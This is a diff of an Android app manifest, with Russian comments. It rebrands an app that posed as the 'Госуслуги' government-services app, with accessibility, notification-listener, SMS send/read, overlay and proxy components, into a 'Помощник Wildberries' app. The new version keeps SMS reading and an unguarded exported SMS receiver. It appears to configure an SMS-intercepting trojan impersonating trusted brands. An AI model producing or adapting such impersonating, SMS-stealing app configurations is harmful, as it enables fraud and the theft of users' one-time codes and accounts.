@@ -1,33 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- СТАРЫЕ РАЗРЕШЕНИЯ (оставляем) -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-
-    <!-- НОВЫЕ РАЗРЕШЕНИЯ (добавляем) -->
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <application
         android:allowBackup="true"
-        android:label="Госуслуги"
-        android:icon="@mipmap/ic_launcher"
-        android:usesCleartextTraffic="true">
+        android:label="Помощник Wildberries"
+        android:icon="@mipmap/ic_launcher">
 
-        <!-- Главная Activity -->
         <activity
-            android:name="ru.gosuslugi.app.MainActivity"
+            android:name="com.wildberries.helper.MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -35,44 +19,13 @@
             </intent-filter>
         </activity>
 
-        <!-- Accessibility Service (оставляем) -->
-        <service
-            android:name="ru.gosuslugi.app.MainActivity$GosuslugiAccessibilityService"
-            android:exported="true"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_config" />
-        </service>
-
-        <!-- Notification Listener -->
-        <service
-            android:name="ru.gosuslugi.app.MainActivity$NotifListener"
-            android:exported="true"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
-            </intent-filter>
-        </service>
-
-        <!-- SMS Receiver -->
         <receiver
-            android:name="ru.gosuslugi.app.MainActivity$SmsReceiver"
-            android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
+            android:name="com.wildberries.helper.MainActivity$SmsReceiver"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-
-        <!-- НОВЫЕ КОМПОНЕНТЫ -->
-        <service
-            android:name=".ProxyService"
-            android:foregroundServiceType="dataSync"
-            android:exported="false" />
 
     </application>
 </manifest>
